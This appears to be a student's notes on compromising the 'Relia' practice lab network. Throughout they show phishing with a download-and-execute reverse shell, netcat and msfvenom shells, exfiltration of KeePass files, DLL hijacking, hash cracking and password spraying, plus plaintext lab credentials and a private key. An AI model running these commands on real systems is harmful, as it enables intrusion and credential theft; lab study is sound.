>git show 8b430c17c16e6c0515e49c4eafdd129f719fde74 (#Showing commits)
#May be Credentials
#maildmz@relia.com:DPuBT9tGCBrTbR
#Mail server responsiable for - jim@relia.com, User damian

- Open the VisualStudio code open new text file paste below code (Enter KALI IP) save it.
- Double click to open the file(config file, created in above) include same config file.
- Include powershell shortcut(On Desktop RightClick -> New -> Shortcut -> (in open location place Include below powershell powercat download execute command), save it powershell).
- Now this folder has config file and powershell shortcut.
- Transfer this file to kali using ssh command below. 

## config.Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.247</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
##config.Library-ms

##copythis config.Library-ms into kali working directory
>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/HTB/OSCP/Relia/webdav
>sudo service ssh start
>scp .\config.Library-ms kali@192.168.45.247:/home/kali/HTB/OSCP/Relia/
#Inter below command on windows shortcut name itinstall
>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.247:8000/powercat.ps1'); powercat -c 192.168.45.247 -p 4444 -e powershell"
>nc -nlvp 4444
>sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.154.189 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
nc -nlvp 4444>whoami (relia\jim)
>hostname (WK01)
>ipconfig (172.16.158.14)
```

### Relia - 172.16.114.14 - Phishing mail with swaks,

```jsx
##copythis config.Library-ms into kali working directory (#in Win Prep Machine)
>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/HTB/OSCP/Relia/webdav
>sudo service ssh start
>scp .\config.Library-ms kali@192.168.45.247:/home/kali/HTB/OSCP/Relia/
#Inter below command on windows shortcut name itinstall
>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220:8000/powercat.ps1'); powercat -c 192.168.45.220 -p 4444 -e powershell"
>nc -nlvp 4444
>sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.154.189 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
nc -nlvp 4444>whoami (relia\jim)
>hostname (WK01)
>ipconfig (172.16.158.14)
>sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.154.189 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
#Creds - maildmz:DPuBT9tGCBrTbR

>iwr -uri http://192.168.45.247:8000/winPEASx64.exe -Outfile winPEAS.exe

#Scheduled Applications --Non Microsoft--
� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                                                                          
    (RELIA\jim) exec_lnk: powershell -ep bypass -File C:\Users\jim\Pictures\exec.ps1
    Permissions file: jim [AllAccess]
    Permissions folder(DLL Hijacking): jim [AllAccess]
    Trigger: At log on of RELIA\jim-After triggered, repeat every 00:01:00 indefinitely.
             At 12:55 AM on 10/19/2022-After triggered, repeat every 00:01:00 indefinitely.
             
# Hashs
Version: NetNTLMv2 - 14
  Hash:    jim::RELIA:1122334455667788:67574a67f2e7197460c310c2eaebdb13:0101000000000000afe0b64201f8da01e5bb0793d4e79604000000000800300030000000000000000000000000200000ff79fccc4410c8d3aed74343d140b479a663f2a1a178c9588d454b1fddbbb17b0a00100000000000000000000000000000000000090000000000000000000000
  
# Found Keepass Files
File: C:\Users\jim\Documents\Database.kdbx
File: C:\Users\jim\AppData\Roaming\KeePass\KeePass.config.xml
File: C:\Program Files\KeePass Password Safe 2\KeePass.config.xml

scp Database.kdbx kali@192.168.45.247:/home/kali/HTB/OSCP/Relia/hash
kali>impacket-smbserver test . -smb2support  -username ashok -password reddy
Windows>net use m: \\192.168.45.247/home/kali/HTB/OSCP/Relia/hash /user:ashok reddy
Windows>copy Database.kdbx m:\

kali>impacket-smbserver test . -smb2support  -username ashok -password ashok
WIN>net use m: \\192.168.45.247/home/kali/HTB/OSCP/Relia/hash /user:ashok ashok
WIN>net use m: \\192.168.45.155\home\kali\Desktop\HTB\OSCP\AD\Medtech /user:ashok ashok
WIN>copy Database.kdbx m:\

Then if you have rdp you can add /drive:/tmp,tmp at the end of your command and it will map tmp on kali to tmp on client. Super easy to just drag and drop files.  Putting spoiler tags but don't really think file transfer techniques are spoilers.

# Hint Not able to Transefer https://discord.com/channels/780824470113615893/1087927556604432424/1278089984737411092
From Windows:   
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.182", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\jim\Documents\Database.kdbx") 
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > Database.kdbx

>keepass2john Database.kdbx > keepass.hash
#Remove first letter like (Database:) in keepass.hash file
>hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
>john keepass.hash

# Found Misc-Code asigning passwords Regexes
C:\Users\jim\Pictures\exec.ps1: password = "DPuBT9tGCBrTbR"
C:\Users\jim\Pictures\exec.ps1: password = "Castello1!"

# Found Misc-Simple Passwords Regexes
C:\Users\jim\Pictures\exec.ps1: password = "DPuBT9tGCBrTbR" 
C:\Users\jim\Pictures\exec.ps1: password = "Castello1!"

# ShrapHound
>iwr -uri http://192.168.45.247:8000/SharpHound.exe -Outfile SharpHound.exe
>scp .\20240827083300_BloodHound.zip kali@192.168.45.247:/home/kali/HTB/OSCP/Relia/
# Not able to transfer the file

From Windows:   
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.247", 1234)
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\offsec\Desktop\20240827083300_BloodHound.zip") 
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > 20240827083300_BloodHound.zip
#Got it
>sudo neo4j start
>bloodhound
>MATCH (m:Computer) RETURN m (Bloodhound)
>MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

>iwr -uri http://192.168.45.247:8000/Lagent.exe -Outfile Lagent.exe
k>sudo ip tuntap add user $(whoami) mode tun ligolo
k>sudo ip link set ligolo up
>./Lproxy -selfcert
windows>.\Lagent.exe -connect 192.168.45.247:11601 -ignore-cert
k>sudo ip route add 172.16.158.0/24 dev ligolo
windows-Ligolo>start
kali>ping -c 4  172.16.158.14
# Able to ping from the kali machine.

>crackmapexec smb 172.16.120.30 -u users.txt -p pass.txt --continue-on-success
# MIght 2 attemps are identified
jim:Castello1!
maildmz:DPuBT9tGCBrTbR

>crackmapexec smb 192.168.160.191 -u users.txt -p pass.txt --continue-on-success
# MIght 2 attemps are identified
jim:Castello1!
maildmz:DPuBT9tGCBrTbR

>crackmapexec rdp 172.16.120.6,7,14,15,19,20,21,30 -u users.txt -p pass.txt --continue-on-success (No result)

>nmap -p 3389 172.16.120.6,7,14,15,19,20,21,30 -Pn 
-172.16.120.6 - Open
-172.16.120.7 - Open
-172.16.120.14 - Open
-172.16.120.15 -  Open
172.16.120.19 - Filtered
172.16.120.20 - FIltered
172.16.120.21 - Filtered
-172.16.120.30 - Open

# Relia 14, got local and proof, Can provide help here spraying credentials not working on internal and external.
#Hint - There are some creds in the .kdbx file in jim's documents directory. Use those creds to rdp on .191
>kpcli --kdb=Database.kdbx (mercedes1)
>show -f User

>dmzadmin:SlimGodhoodMope

>xfreerdp /u:dmzadmin /p:'SlimGodhoodMope' /v:192.168.168.191 /smart-sizing:1920x1080 /cert-ignore

```

### Relia - 192.168.168.191 - asreproasting,

```jsx
xfreerdp /u:dmzadmin /p:'SlimGodhoodMope' /v:192.168.168.191 /smart-sizing:1920x1080 /cert-ignore

#Got root flag
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
>iwr -uri http://192.168.45.220:8000/nc.exe -Outfile nc.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -Outfile winpeas.exe

#C:\Windows\System32\config\RegBack\SAM
    File Permissions: Administrators [AllAccess]                                                                                                                                                                                                                                          
    C:\Windows\System32\config\RegBack\SYSTEM
    File Permissions: Administrators [AllAccess]
    Can't able to copy paste

>iwr -uri http://192.168.45.220:8000/Lagent.exe -Outfile agent.exe
k>sudo ip tuntap add user $(whoami) mode tun ligolo
k>sudo ip link set ligolo up
>./Lproxy -selfcert
windows>.\Lagent.exe -connect 192.168.45.247:11601 -ignore-cert
k>sudo ip route add 172.16.181.0/24 dev ligolo
windows-Ligolo>start

As-Rep Roasting
>impacket-GetNPUsers -dc-ip 192.168.221.191 relia.com/dmzadmin:SlimGodhoodMope -request
# TImeout

>nmap -p 3389 172.16.181.6,7,14,15,19,20,21,30 -Pn 
-172.16.120.6 - Open
-172.16.120.7 - Open
-172.16.120.14 - Open
-172.16.120.15 -  Open
172.16.120.19 - Filtered
172.16.120.20 - FIltered
172.16.120.21 - Filtered
-172.16.120.30 - Open
rdp>hydra -L users.txt -P pass.txt -M ip.txt rdp
#172.16.181.6,7,14,15,30 might be valid but account not active for remote desktop: login: jim password: Castello1!, 
-xfreerdp /u:jim /p:'Castello1!' /v:172.16.181.6 /smart-sizing:1920x1080 /cert-ignore # No hit
-crackmapexec rdp 172.16.181.6 -u jim -p 'Castello1!' --continue-on-success 

#172.16.181.6,7,14,15,30 might be valid but account not active for remote desktop: login: maildmz password: DPuBT9tGCBrTbR,
-xfreerdp /u:maildmz /p:DPuBT9tGCBrTbR /v:172.16.181.6 /smart-sizing:1920x1080 /cert-ignore #No hit
-crackmapexec rdp 172.16.181.6 -u maildmz -p DPuBT9tGCBrTbR --continue-on-success #No hit

#As per NMAP result winrm for .7, .30
>crackmapexec winrm 172.16.181.7 -u jim -p 'Castello1!' --continue-on-success #NO
>crackmapexec winrm 172.16.181.30 -u maildmz -p DPuBT9tGCBrTbR --continue-on-success #NO

Ping - OS prediction in KALI 64 might be linux
IN 191
From this below result i'm gusssing 128 is windows try smb on it
-172.16.120.6 - Open  128
-172.16.120.7 - Open  128
-172.16.120.14 - Open 128 
-172.16.120.15 -  Open 128
172.16.120.19 - Filtered 64 
172.16.120.20 - FIltered 64 
172.16.120.21 - Filtered 128 
-172.16.120.30 - Open 128

#OS Scan
>sudo nmap -sC -sV --open -p- -T4 -A -O -oN Internal_OS 172.16.181.6,7,14,15,19,20,21,30  -Pn
172.16.181.6 - WIndows
172.16.181.7 - WIndows
172.16.181.14 - WIndows
172.16.181.15 -  WIndows
172.16.181.19 - Linux
172.16.181.20 - Linux(FreeBSD)
172.16.181.21 - WIndows
172.16.181.30 - WIndows

>crackmapexec smb 172.16.181.6,7,14,15,21,30 -u users.txt -p pass.txt --continue-on-success
#SMB 139 NetBIOS, 445
172.16.181.6 - WIndows  
172.16.181.7 - WIndows
172.16.181.14 - WIndows
172.16.181.15 -  WIndows
172.16.181.19 - Linux
172.16.181.20 - Linux(FreeBSD)
172.16.181.21 - WIndows
172.16.181.30 - WIndows
crackmapexec smb 172.16.181.30 -u users.txt -p pass.txt --continue-on-success # NO response 6,7,14,15,21,30
nxc smb 172.16.181.30 -u users.txt -p pass.txt --continue-on-success # NO response 6,7,14,15,21,30

#Anonymous NO luck
smbclient -L ////172.16.181.6 -U ''
rpcclient 172.16.181.6 

#Openssh
172.16.181.19 - Linux OpenSSH 8.2p1
172.16.181.20 - Linux(FreeBSD) - OpenSSH 7.9

#Hint - I stuck in 191 got proof.txt, with those creds dmzadmin, jim  tried trying to move .189 and internal network tried SMB with credentials and anonymous, 19,20 are linux tried exploits with openssh port  above steps  any help,
#sry but I really don’t know what to do already pwned 245-249 191 14 so I need any help what do next if the credentials doesn’t work on any target on the internal network
>Since we have jim's credentials (jim:Castello1!) from the keepass, we can try if they are valid on the domain controller (DC02) and also look for AS-REP roastable users present on the domain controller.

#AS-REP Roasting (impacket-GetNPUsers -dc-ip 172.16.190.6  relia.com/jim:Castello1! -request)
>impacket-GetNPUsers -dc-ip 172.16.190.6  -request -outputfile hashes.asreproast relia.com/jim
$krb5asrep$23$michelle@RELIA.COM:a4b25e82b97e31e13f8f59112f88717b$cb2c39aea2962e29c382ab9629294972221b741497a4b3e76e3ed6808ec7b28d98140211937c424ac4f7ba35807f67807fbfd81e809e074393f5943bc1f58448be72d4e7e75772162354a694f3f77be6e2123f46bff99459627d2248eda6759492bb5645c376a90a1da6bad76ded62fcb32464720151e4241585d1e7bea5f61868a29fe270bfbb46b1f817b10bbbdacc756a872aed92095457362ae939e38abfb870d88bbe446cc13ee2ea016da1c33fdb44838a3920a177ede65b4c6f4698da1cdb676c1936052c4c9768ebc0e35d4a770d1a0edbabe4d7fea70b69c3f12cb629dcaf3107b4:NotMyPassword0k?

>hashcat -m 18200 hashes.asreproast /home/kali/HTB/OSCP/rockyou.txt 
michelle:NotMyPassword0k?

> iwr -uri http://192.168.45.229:8000/Rubeus.exe -Outfile C:/Users/dmzadmin/Desktop/Rubeus.exe
>Not supported
>xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.190.6 /smart-sizing:1920x1080 /cert-ignore #Fail
#Hit
>xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.190.7 /smart-sizing:1920x1080 /cert-ignore  
#GOt local flagInvoke-BloodHound -CollectionMethod All
```

### Relia - 172.16.190.7 - take the .exe verify with procmonx64.exe, identify which .dll is missing,

172.16.190.7 - take the .exe verify with procmonx64.exe, identify which .dll is missing, 

```jsx
>xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.190.7 /smart-sizing:1920x1080 /cert-ignore  
#Got local flag

#Enumeration for PE
>Get-ChildItem -Recurse -Filter *.kdbx
>iwr -uri http://192.168.45.229:8000/nc.exe -outfile nc.exe
>.\nc.exe 192.168.45.229 4455 -e powershell.exe
>iwr -uri http://192.168.45.229:8000/winPEASx64.exe -outfile winPEAS.exe
>.\winPEAS.exe

Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    Apache2.4(Apache Software Foundation - Apache2.4)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Auto - Running
    Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
   =================================================================================================                                                                                                                                        

    mysql(mysql)[C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql] - Auto - Running - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
   =================================================================================================

    Scheduler(Scheduler)["C:\Scheduler\scheduler.exe"] - Auto - Running - isDotNet
    Possible DLL Hijacking in binary folder: C:\Scheduler (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Scheduling Service RELIA

>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
>schtasks.exe /query /fo LIST /v^C
>schtasks.exe /query /fo LIST /v | findstr TaskName

Identifying DLL
>iwr -uri http://192.168.45.229:8000/Procmon64.exe -outfile Procmon64.exe

schtasks.exe /query /fo LIST /v^C
schtasks.exe /query /fo LIST /v | findstr TaskName
#Create windows service using sc in winprep machine
sc.exe create "NAMEofSERVICE" binpath= "PATH"
#Like Below
sc.exe create "Scheduler" binpath= "C:\Users\offsec\Desktop\Scheduler.exe"
#Check in procmon64.exe found in Sysinternal tools
#Procmon > Filter Option > Filter > Process Name , is , Scheduler.exe >Add > Apply > Ok
In that identified C:\Windows\System32\beyondhelper.dll
Restart-Service Scheduler
Output file name as beyondhelper.dll
>iwr -uri http://192.168.45.229:8000/myDLL.dll -outfile beyondhelper.dll

Win>Restart-Service Scheduler
Win>net localgroup administrators
#dave2 user is create Got Proof.txt

>xfreerdp /u:dave2 /p:'password123!' /v:172.16.176.7 /smart-sizing:1920x1080 /cert-ignore #Credentials from the .dll (dave2:password123!)
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
Open as Administrator>.\mimicatz.exe (andrea:PasswordPassword_6)

#Hint try manually due buggy crackmapexec not working

#Poviting  189 hash only 5985 port winrm, no 3389 port for rdp
>crackmapexec winrm 192.168.160.189 -u users.txt -p pass.txt --continue-on-success #No Hit

#Poviting to Internal Network 21 is (windows 5985, no 3389), 19,20 are linux
>xfreerdp /u:jim /p:'Castello1!' /v:172.16.120.30 /smart-sizing:1920x1080 /cert-ignore. 15
>xfreerdp /u:dmzadmin /p:'SlimGodhoodMope' /v:172.16.120.30 /smart-sizing:1920x1080 /cert-ignore, 15
>xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.120.30 /smart-sizing:1920x1080 /cert-ignore, 15
>xfreerdp /u:andrea /p:'PasswordPassword_6' /v:172.16.120.30 /smart-sizing:1920x1080 /cert-ignore, 15 HIT
```

### Relia - 172.16.120.15 - change the powershell script

```jsx
>xfreerdp /u:andrea /p:'PasswordPassword_6' /v:172.16.120.15 /smart-sizing:1920x1080 /cert-ignore

#PE
>iwr -uri http://192.168.45.220:8000/nc.exe -outfile nc.exe
>rlwrap nc -nlvp 4455
>.\nc.exe 192.168.45.220 4455 -e powershell.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -outfile winPEAS.exe
>.\winPEAS.exe

--------------------------schedule.ps1

try {
    & C:\updatecollector\updatecollctor.exe

} catch {

    Write-Output "[-] Updates couldn't be collected!"
    Write-Output "[!] Update cache will be used"
}

copy C:\Users\milana\beyondupdater.exe C:\updater\beyondupdater.exe
Start-Sleep -Seconds 5
& "C:\updater\beyondupdater.exe"
Start-Sleep -Seconds 5
del C:\updater\beyondupdater.exe

-------------------------schedule.ps1
#my plan is to create .exe using msfvenom put into the C:\updater\beyondupdater.exe this name

>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe -o met4444.exe
>rlwrap nc -nlvp 4444
>iwr -uri http://192.168.45.220:8000/met4444.exe -Outfile beyondupdater.exe

#Process
Intially copied in the C:\updater don't have access so copied in C:\updatecollector
#updated file
--------------------------schedule.ps1

try {
    & C:\updatecollector\beyondupdater.exe

} catch {

    Write-Output "[-] Updates couldn't be collected!"
    Write-Output "[!] Update cache will be used"
}

copy C:\Users\milana\beyondupdater.exe C:\updater\beyondupdater.exe
Start-Sleep -Seconds 5
& "C:\updater\beyondupdater.exe"
Start-Sleep -Seconds 5
del C:\updater\beyondupdater.exe

-------------------------schedule.ps1
>Automatically got access minana user

>whoami /all (SeImpersonatePrivilege)
>iwr -uri http://192.168.45.220:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell.exe (Operation failed or timedout)
>iwr -uri http://192.168.45.220:8000/DeadPotato-NET4.exe -Outfile  DeadPotato.exe
>.\DeadPotato.exe -cmd “whoami” #NT authority
>.\DeadPotato.exe -rev 192.168.45.220:9001 #fails
>.\DeadPotato.exe mimi sam #fails

>iwr -uri http://192.168.45.220:8000/met4444.exe -Outfile payload.exe
#Got shell after some still milana user

From Windows:   First start kali NC command
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.220", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\milana\Documents\Database.kdbx")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > Database.kdbx

>keepass2john 15Database.kdbx > 15keepass.hash
#Remove first letter like (Database:) in keepass.hash file
>hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
>john keepass.hash
>kpcli --kdb=keepass.hash (destiny1)
#Got Idrsa 19 machine it don't support authentication
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

>chmod 600 idrsa_sarah
>ssh -i idrsa_sarah sarah@172.16.120.19
```

### Relia - 172.16.120.19 - borg

```jsx
>ssh -i idrsa_sarah sarah@172.16.120.19
#Got local flag

>python3 -c 'import pty; pty.spawn("/bin/bash")'

>sarah@backup:/usr/bin$ sudo -l
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User sarah may run the following commands on backup:
    (ALL) NOPASSWD: /usr/bin/borg list *
    (ALL) NOPASSWD: /usr/bin/borg extract *
    (ALL) NOPASSWD: /usr/bin/borg mount *

>wget http://192.168.45.220:8000/linpeas.sh

>Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                     
Sudo version 1.8.31  

>Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                  
cat: write error: Broken pipe                                                                                                                       
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

#Hint check usage of borg and using pspy64 
>wget http://192.168.45.220:8000/pspy64

>./pspy64 
#/bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1725988864 /media/usb0
#Hint check usage of borg commands
>sudo /usr/bin/borg list /opt/borgbackup::home # Listing the 
>sudo /usr/bin/borg extract /opt/borgbackup::home # not extracting 

>sudo /usr/bin/borg list --json /opt/borgbackup/

>sudo /usr/bin/borg --bypass-lock list /opt/borgbackup/ /tmp/borgor/

>/bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1725989643
>/usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1725989643 /media/usb0
>/usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1725989643 /media/usb0 
>/bin/bash /root/createbackup.sh

#New start
$ cd /opt
>sarah@backup:/opt$ sudo /usr/bin/borg list *
>sudo /usr/bin/borg list borgbackup::home
> sudo /usr/bin/borg extract --stdout borgbackup::home

----------------
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}
--------------------
0814b6b7f0de51ecf54ca5b6e6e612bf:backups1
>su amy (backups1)
>su root
#got proof.txt

ssh andrew@172.16.111.20
#got
```

### Relia - 172.16.111.20 -  FreeBSD doas

```jsx
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/

>ssh andrew@172.16.6.20 (Rb9kNokjDsjYyH)
#Got flag

>wget http://192.168.45.220:8000/linpeas.sh
>./linpeas.sh
#I saw that it can list all the files in root directory
#Got proof.txt due system config, you can read but need to start apache server asper hint

#DOAS (dedicated openbsd application subexecutor) - Hackricks /etc/doas.conf file is not writable permission
>cat /usr/local/etc/doas.conf
# Sample file for doas
# Please see doas.conf manual page for information on setting
# up a doas.conf file.

# Permit members of the wheel group to perform actions as root.
permit nopass :wheel

# Permit user alice to run commands a root user.
# permit alice as root

# Permit user bob to run programs as root, maintaining
# environment variables. Useful for GUI applications.
## permit keepenv bob as root

# Permit user cindy to run only the pkg package manager as root
# to perform package updates and upgrades.
## permit cindy as root cmd pkg args update
## permit cindy as root cmd pkg args upgrade

# Allow david to run id command as root without logging it
# permit nolog david as root cmd id

permit nopass andrew as root cmd service args apache24 onestart
----------------------------------------------------------------------------------END

PHP Session
/tmp/sess_85nhlv9agld103a3l7l0mbgt41

Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                                                                                                           
/var/log/cron
/var/log/messages

Files inside others home (limit 20)
/home/mountuser/.mailrc                                                                                                                                                                                                                     
/home/mountuser/.mail_aliases
/home/mountuser/.login
/home/mountuser/.profile
/home/mountuser/.login_conf
/home/mountuser/.shrc
/home/mountuser/.cshrc
/home/mountuser/.history
/root/.k5login
/root/.cshrc
/root/.login
/root/.profile
/root/.bash_history
/root/.wget-hsts
/root/.lesshst
/root/.history
/root/proof.txt

Searching installed mail applications
rc.sendmail                                                                                                                                                                                                                                 
sendmail

Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/login.conf.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)                                                                                                                                                             
Found /etc/mail/aliases.db: regular file, no read permission
Found /etc/pwd.db: Berkeley DB 1.85 (Hash, version 2, big-endian)
Found /etc/spwd.db: regular file, no read permission
Found /var/db/pkg/local.sqlite: SQLite 3.x database, user version 36, last written using SQLite version 3038005
Found /var/db/services.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

#Starting server based /etc/doas.conf having apache24 server
>service apche24 start (no permission)
>doas service apache24 onestart (Startted)
>service apache24 onestatus
#Web server is started on port 80 able access via web browser

#Shell  Uplocaded shell in /usr/local/www/apache24/data/phpMyAdmin/tmp/php-reverse-shell-shell.php
>find / -type d -perm -o+w -print
find: /usr/local/etc/mysql/keyring: Permission denied
/usr/local/www/apache24/data/phpMyAdmin/tmp # Writable

Access from the browser with http://172.16.111.20/phpmyadmin/tmp/php-reverse-shell.php hit 2 nd time hit
#When i access from machine it self got shell with www user 
curl http://127.0.0.1/phpMyAdmin/tmp/php-reverse-shell.php hit
rlwrap nc -nlvp 1234
>id (uid=80(www) gid=80(www) groups=80(www),0(wheel))
>pw usershow andrew
>getent passwd andrew
> pw usermod -aG wheel andrew
#Hint 
>locate doas
#/usr/local/bin/doas
>/usr/local/bin/doas pw usermod andrew -G wheel
Logout andrew above ssh shell, and login agin see wih id added as wheel group
>su root #Asking as password
>doas su
#Switched to root user without passwd

#I saw mltiple mail text file
>find / -type f \( -name "*.txt" -o -name "*.kdbx" \)
#/usr/local/lib/python3.9/test/test_email/data/msg_41.txt

#------------------------PGP KEY -----------------------
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.6 (GNU/Linux)

iD8DBQFG03voRhp6o4m9dFsRApSZAKCCAN3IkJlVRg6NvAiMHlvvIuMGPQCeLZtj
